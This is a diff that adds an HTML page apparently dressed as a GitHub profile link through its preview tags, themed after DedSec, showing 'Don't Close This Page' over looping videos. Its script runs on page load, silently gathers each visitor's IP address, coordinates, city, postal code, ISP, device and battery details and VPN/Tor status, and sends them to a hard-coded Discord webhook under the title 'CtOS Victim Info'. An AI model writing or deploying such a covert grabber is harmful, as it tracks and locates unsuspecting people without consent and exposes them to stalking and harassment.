@@ -1,1 +1,259 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <!-- ===== EMBED META TAGS (con URL de imagen forzada para cache) ===== -->
+    <meta property="og:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
+    <meta property="og:image:alt" content="PotatoDestroyer has one repository available. Follow their code on GitHub." />
+    <meta property="og:title" content="PotatoDestroyer - Profile" />
+    <meta property="og:url" content="https://potatodestroyer999.github.io/Follow" />
+    <meta property="og:description" content="PotatoDestroyer999 has one repository available. Follow their code on GitHub." />
+    <meta property="og:site_name" content="GitHub" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="PotatoDestroyer - Profile" />
+    <meta name="twitter:description" content="PotatoDestroyer has one repository available. Follow their code on GitHub." />
+    <meta name="twitter:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
+    <!-- ===== FIN EMBED META TAGS ===== -->
 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OMG! IT'S DEDSEC</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            position: relative;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            background-image: url('https://i.imgur.com/cVnL0wo.png');
+            background-repeat: repeat;
+        }
+        .texto-no-interactivo {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 3em;
+            color: #00ff00;
+            padding: 15px;
+            text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
+            margin-top: 15vh;
+            pointer-events: none;
+            z-index: 10;
+        }
+        #video-inferior {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            max-width: 800px;
+            height: auto;
+            z-index: 5;
+        }
+        #video-esquina-izquierda {
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            width: 100px;
+            height: auto;
+            z-index: 10;
+            pointer-events: none;
+        }
+        #status {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: #00ff00;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            z-index: 999;
+            border: 1px solid #00ff00;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        #status.error {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="texto-no-interactivo">Don't Close This Page</div>
+
+    <video id="video-inferior" autoplay muted loop playsinline>
+        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
+    </video>
+    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
+        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
+    </video>
+
+    <div id="status">Loading...</div>
+
+    <script>
+        (function() {
+            const statusEl = document.getElementById('status');
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
+
+            function getDeviceInfo() {
+                const nav = navigator;
+                const ua = nav.userAgent;
+                let os = 'Unknown';
+                if (ua.indexOf('Win') !== -1) os = 'Windows';
+                else if (ua.indexOf('Mac') !== -1) os = 'macOS';
+                else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+                else if (ua.indexOf('Android') !== -1) os = 'Android';
+                else if (ua.indexOf('iOS') !== -1 || ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
+
+                let browser = 'Unknown';
+                if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+                else if (ua.indexOf('Chrome') !== -1) browser = 'Chrome';
+                else if (ua.indexOf('Safari') !== -1) browser = 'Safari';
+                else if (ua.indexOf('Edge') !== -1) browser = 'Edge';
+                else if (ua.indexOf('Opera') !== -1) browser = 'Opera';
+
+                return {
+                    userAgent: ua,
+                    os: os,
+                    browser: browser,
+                    language: nav.language || 'en-US',
+                    platform: nav.platform || 'unknown',
+                    hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
+                    deviceMemory: nav.deviceMemory || 'unknown (GB)',
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString()
+                };
+            }
+
+            async function getBatteryInfo() {
+                try {
+                    if (navigator.getBattery) {
+                        const batt = await navigator.getBattery();
+                        return {
+                            level: Math.round(batt.level * 100) + '%',
+                            charging: batt.charging ? 'Yes' : 'No',
+                            chargingTime: batt.chargingTime + 's',
+                            dischargingTime: batt.dischargingTime + 's'
+                        };
+                    }
+                } catch (e) {}
+                return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+            }
+
+            async function sendToDiscord(ipData, device, battery, torDetected) {
+                let vpnTorStatus = 'No VPN/TOR Found';
+                const proxyDetected = ipData.proxy === true;
+                if (proxyDetected && torDetected) {
+                    vpnTorStatus = 'VPN and TOR Detected';
+                } else if (proxyDetected) {
+                    vpnTorStatus = 'VPN Detected';
+                } else if (torDetected) {
+                    vpnTorStatus = 'TOR Detected';
+                }
+
+                const fields = [
+                    { name: 'IP Address', value: ipData.ip || 'N/A', inline: true },
+                    { name: 'Coordinates', value: ipData.latitude && ipData.longitude ? ipData.latitude + ', ' + ipData.longitude : 'N/A', inline: true },
+                    { name: 'City / Region / Country', value: (ipData.city || 'N/A') + ', ' + (ipData.region || 'N/A') + ', ' + (ipData.country_name || 'N/A'), inline: false },
+                    { name: 'Postal Code / ISP', value: (ipData.postal || 'N/A') + ' | ' + (ipData.org || ipData.isp || 'N/A'), inline: false },
+                    { name: 'RAM (GB)', value: device.deviceMemory || 'N/A', inline: true },
+                    { name: 'Battery', value: battery.level + ' (Charging: ' + battery.charging + ')', inline: true },
+                    { name: 'Operating System / Browser', value: device.os + ' / ' + device.browser, inline: true },
+                    { name: 'Screen', value: device.screenWidth + 'x' + device.screenHeight + ' @ ' + device.colorDepth + 'bits', inline: true },
+                    { name: 'CPU Cores', value: device.hardwareConcurrency || 'N/A', inline: true },
+                    { name: 'Timezone', value: device.timezone || 'N/A', inline: true },
+                    { name: 'Timestamp', value: device.timestamp || 'N/A', inline: false },
+                    { name: 'Full User-Agent', value: device.userAgent || 'N/A', inline: false },
+                    { name: 'VPN/TOR Status', value: vpnTorStatus, inline: false }
+                ];
+
+                const payload = {
+                    username: 'Bagley',
+                    avatar_url: 'https://i.imgur.com/HsHtn2b.jpeg',
+                    embeds: [{
+                        title: 'CtOS Victim Info',
+                        color: 0x00ff00,
+                        fields: fields,
+                        footer: { text: 'R3TRO' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                try {
+                    const resp = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (resp.ok) {
+                        statusEl.textContent = 'Sent Data';
+                        statusEl.className = '';
+                    } else {
+                        statusEl.textContent = 'Error: ' + resp.status;
+                        statusEl.className = 'error';
+                    }
+                } catch (e) {
+                    statusEl.textContent = 'Sending Error: ' + e.message;
+                    statusEl.className = 'error';
+                }
+            }
+
+            async function execute() {
+                const device = getDeviceInfo();
+                const batteryPromise = getBatteryInfo();
+                const geoPromise = fetch('https://ipapi.co/json/')
+                    .then(res => res.ok ? res.json() : null)
+                    .catch(() => null);
+                const torPromise = fetch('https://check.torproject.org/api/ip')
+                    .then(res => res.ok ? res.json() : null)
+                    .catch(() => null);
+
+                const [battery, geoData, torData] = await Promise.all([batteryPromise, geoPromise, torPromise]);
+
+                let ipData = geoData;
+                if (!ipData || !ipData.ip) {
+                    try {
+                        const ipResp = await fetch('https://api.ipify.org?format=json');
+                        const ipJson = await ipResp.json();
+                        ipData = {
+                            ip: ipJson.ip,
+                            latitude: 'N/A',
+                            longitude: 'N/A',
+                            city: 'N/A',
+                            region: 'N/A',
+                            country_name: 'N/A',
+                            postal: 'N/A',
+                            org: 'N/A',
+                            isp: 'N/A',
+                            proxy: false,
+                            tor: false
+                        };
+                    } catch (e) {
+                        ipData = { ip: 'Unknown', proxy: false, tor: false };
+                    }
+                }
+
+                const torDetected = torData && torData.IsTor === true;
+                await sendToDiscord(ipData, device, battery, torDetected);
+            }
+
+            if (document.readyState === 'complete') {
+                execute();
+            } else {
+                window.addEventListener('load', execute);
+            }
+
+            statusEl.textContent = 'Loading...';
+        })();
+    </script>
+</body>
+</html>
